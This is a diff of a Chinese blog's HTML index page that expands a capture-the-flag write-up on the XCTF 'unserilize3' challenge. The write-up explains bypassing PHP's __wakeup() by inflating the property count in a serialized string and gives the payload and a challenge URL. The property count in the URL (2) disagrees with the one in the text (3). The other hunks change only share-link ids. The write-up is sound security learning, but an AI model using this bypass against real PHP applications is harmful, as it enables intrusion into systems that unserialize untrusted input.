@@ -93,12 +93,18 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p>由题干unserilize:得知与反序列化有关！<br>上来给了一串php代码：<br>    <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure><br>（推测这个?code&#x3D;应该是让我们以get方式提交code的值）</p>
+        <p>由题干unserilize:得知与反序列化有关！<br>上来给了一串php代码：<br>    <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;                     <span class="comment">//定义一个名为xctf的类</span></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;           <span class="comment">//定义一个公有的类属性$flag，值为111</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;     <span class="comment">//定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本</span></span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure><br>（推测这个?code&#x3D;应该是让我们以get方式提交code的值）<br>注意发现到有个wakeup()函数，我们要想办法绕过这个函数。</p>
+<p>wakeup()有个执行漏洞:一个字符串或对象被序列化后，如果其属性被修改，则不会执行wakeup()函数，这也算是一个绕过点</p>
+<p>代码中的__wakeup()方法如果使用就是和unserialize()反序列化函数结合使用的，这里没有序列化字符串，何来反序列化呢？于是，我们这里实例化xctf类并对其使用序列化（这里就实例化xctf类为对象a）<br>   <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;                       <span class="comment">//定义一个名为xctf的类</span></span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;             <span class="comment">//定义一个公有的类属性$flag，值为111</span></span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;       <span class="comment">//定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本</span></span><br><span class="line"> <span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">xctf</span>();           <span class="comment">//使用new运算符来实例化该类（xctf）的对象为a</span></span><br><span class="line"> <span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));       <span class="comment">//输出被序列化的对象（a）</span></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>代码执行结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/*xctf类后面有一个1,整个1表示的是xctf类中只有1个属性</span><br><span class="line">__wakeup()漏洞就是与序列化字符串的整个属性个数有关。当序列化字符串所表示的对象，</span><br><span class="line">其序列化字符串中属性个数大于真实属性个数时就会跳过__wakeup的执行，从而造成__wakeup()漏洞</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
+<p>因此，我们要反序列化xctf类的同时还要绕过__wakeup方法的执行（如果不绕过__wakeup()方法，那么将会输出bad requests并退出脚本）。<br>__wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值<code>大于</code>真实个数的属性时就会跳过__wakeup的执行。因此，需要<code>修改序列化字符串中的属性个数</code>：<br>当我们将上述的序列化的字符串中的对象属性个数由真实值1修改为3，即如下所示<br><code>O:4:&quot;xctf&quot;:3:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code><br>最后进行url的访问：<br><code>http://111.198.29.45:30940?code=O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code><br>即可得到flag!!!</p>
+<p>下附序列化字符串各部分简单释义：<br>O代表结构类型为：类:4表示类名长度:接着是类名:属性（成员）个数<br>大括号内分别是：属性名类型;长度:名称:值类型:长度:值</p>
+<p>（大量照搬有种负罪感，但是自我的消化与理解必然是个漫长的过程，继续学习，深入理解，加油！）</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/12/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cunserilize3%E9%A2%98%E8%A7%A3%E5%8F%8A%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/" data-id="clc63omdk00051oaiahujhlu2" data-title="攻防世界unserilize3题解及一些知识点" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/12/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cunserilize3%E9%A2%98%E8%A7%A3%E5%8F%8A%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/" data-id="clc647fkd0002t8ai7sbs0h4w" data-title="攻防世界unserilize3题解及一些知识点" class="article-share-link">Share</a>
       
       
       
@@ -144,7 +150,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/12/23/XFF%E5%92%8CReferer/" data-id="clc63omdf00011oaia8q6b5lt" data-title="XFF和Referer" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/12/23/XFF%E5%92%8CReferer/" data-id="clc647fke0004t8aiavvq6b6y" data-title="XFF和Referer" class="article-share-link">Share</a>
       
       
       
@@ -185,7 +191,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/12/23/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" data-id="clc63omdj00041oai47j3a4ps" data-title="php伪协议" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/12/23/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" data-id="clc647fkb0001t8ai4k6169vr" data-title="php伪协议" class="article-share-link">Share</a>
       
       
       
@@ -252,7 +258,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/12/23/%E6%9C%BA%E5%99%A8%E4%BA%BA%E6%8E%92%E9%99%A4%E6%A0%87%E5%87%86%EF%BC%88robot%20exclusion%20standard)/" data-id="clc63omdh00021oaic897c84q" data-title="机器人排除标准（robot exclusion standard)" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/12/23/%E6%9C%BA%E5%99%A8%E4%BA%BA%E6%8E%92%E9%99%A4%E6%A0%87%E5%87%86%EF%BC%88robot%20exclusion%20standard)/" data-id="clc647fkh0005t8ai13v089p4" data-title="机器人排除标准（robot exclusion standard)" class="article-share-link">Share</a>
       
       
       
@@ -296,7 +302,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/11/02/URL%E4%B8%8E%E7%BD%91%E5%9D%80/" data-id="clc63omdi00031oaifrl0eeox" data-title="URL与网址" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/11/02/URL%E4%B8%8E%E7%BD%91%E5%9D%80/" data-id="clc647fkd0003t8aigashbskr" data-title="URL与网址" class="article-share-link">Share</a>
       
       
       
@@ -335,7 +341,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/11/02/AGrandTrial/" data-id="clc63omdb00001oaiavb34ot9" data-title="A Grand Trial" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/11/02/AGrandTrial/" data-id="clc647fk70000t8ai4ga2boel" data-title="A Grand Trial" class="article-share-link">Share</a>
       
       
       
